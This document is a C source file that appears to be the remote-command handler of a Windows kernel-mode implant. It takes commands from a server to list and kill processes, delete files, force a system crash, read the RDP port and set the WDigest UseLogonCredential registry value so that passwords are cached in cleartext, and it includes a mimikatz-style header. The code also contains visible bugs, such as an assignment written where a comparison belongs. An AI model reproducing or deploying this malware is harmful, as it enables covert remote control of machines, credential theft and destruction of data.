#include "command.h"
#include "config.h"
#include "xlog.h"
#include "system.h"
#include "minimimikatz.h"





#define CMD_TASKLIST "ps"
#define CMD_KILL "kill"
#define CMD_DEL "del"
#define CMD_REBOOT "reboot"
#define CMD_QRDP "qrdp"
#define CMD_SETCLEARTEXT "setct"
#define CMD_QUERYUSER "quser"
NTSTATUS HandleServerPacket(
	PCHAR msg,
	PCHAR pNeedReply
) {

	LONG msgLen = strlen(msg);
	if (msgLen > NETBUFF_LENGTH) {
		xLog("buffer over flowed");
		pNeedReply = FALSE;
		return STATUS_UNSUCCESSFUL;
	}
	msg[NETBUFF_LENGTH - 1] = 0;
	if (msgLen > 0) {
		if (msg[msgLen - 1] = '\n') {
			msg[msgLen - 1] = 0;
		}
		msgLen--;
	}
	//RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "recv length: %ld\n", msgLen);
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	if (strncmp(msg, CMD_TASKLIST, strlen(CMD_TASKLIST)) == 0) {
		status = tasklist_user(msg, NETBUFF_LENGTH);
	}
	if (strncmp(msg, CMD_QUERYUSER, strlen(CMD_QUERYUSER)) == 0) {
		status = user_UsersInfo(msg, NETBUFF_LENGTH);
	}

	if (strncmp(msg, CMD_KILL, strlen(CMD_KILL)) == 0) {

		ANSI_STRING ansipid;
		RtlInitAnsiString(&ansipid, msg + strlen(CMD_KILL));
		UNICODE_STRING unipid;
		RtlAnsiStringToUnicodeString(&unipid, &ansipid, TRUE);
		DWORD pid = -1;
		//status = RtlUnicodeStringToInt64(&unipid, 0, &pid, NULL);
		status = RtlUnicodeStringToInteger(&unipid, 0, &pid);
		if (NT_SUCCESS(status)) {
			status = xkill3(pid);
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xkill 3 success return %p\n", status);
		}
		RtlFreeUnicodeString(&unipid);

	}
	//return STATUS_UNSUCCESSFUL;
	if (strncmp(msg, CMD_DEL, strlen(CMD_DEL)) == 0) {
		status = xDelFile3(msg + strlen(CMD_DEL) + 1);

		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xdel 3 return %p\n", status);
		status = STATUS_SUCCESS;
	}

	if (strncmp(msg, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
		//nothing will return
		KeBugCheck(POWER_FAILURE_SIMULATE);
	}

	if (strncmp(msg, CMD_QRDP, strlen(CMD_QRDP)) == 0) {
		//query rdp
		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
		//UNICODE_STRING uniV;

		//RtlInitUnicodeString(&uniV, L"ImagePath");
		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", pKvi, 400);
		if (NT_SUCCESS(status)) {
			//xLogL(pKvi->Data, pKvi->DataLength);
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read rdp port: %d\n", *((DWORD*)pKvi->Data));
		}
		else
		{
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
		}
		ExFreePoolWithTag(pKvi, 'lreg');
		status = STATUS_SUCCESS;
	}
	if (strncmp(msg, CMD_SETCLEARTEXT, strlen(CMD_SETCLEARTEXT)) == 0) {
		//set cleartext
		DWORD cleartextEn = 1;
		status = setRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", REG_DWORD, &cleartextEn, sizeof(DWORD));
		if (!NT_SUCCESS(status)) {
			//xLogL(pKvi->Data, pKvi->DataLength);
			goto HANDLER_CMD_END;
		}
		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
		//UNICODE_STRING uniV;

		//RtlInitUnicodeString(&uniV, L"ImagePath");
		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", pKvi, 400);
		if (NT_SUCCESS(status)) {
			//xLogL(pKvi->Data, pKvi->DataLength);
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read UseLogonCredential key: %d\n", *((DWORD*)pKvi->Data));
		}
		else
		{
			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
		}
		ExFreePoolWithTag(pKvi, 'lreg');
		status = STATUS_SUCCESS;
	}


HANDLER_CMD_END:
	if (!NT_SUCCESS(status)) {
		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Command Execute Failed: 0x%p\n", status);
	}

	*pNeedReply = TRUE;
}